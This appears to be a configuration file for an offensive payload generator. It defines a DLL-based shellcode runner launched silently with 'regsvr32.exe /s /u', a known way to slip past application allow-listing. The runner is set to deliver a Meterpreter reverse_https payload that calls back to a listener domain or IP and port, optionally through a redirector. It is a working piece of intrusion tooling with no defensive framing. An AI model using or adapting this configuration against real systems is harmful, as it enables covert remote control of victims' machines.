[Type]
name: regsvr32dll
info: DLL based shellcode runner
template: ./template/SCT/allthethings.template
runInfo: regsvr32.exe /s /u ${Output:var}

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 80
allowWilds: True
forceInteger: True
help: Your listener port

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Output]
var: allthethings_regsvr32dll.cs
allowWilds: True
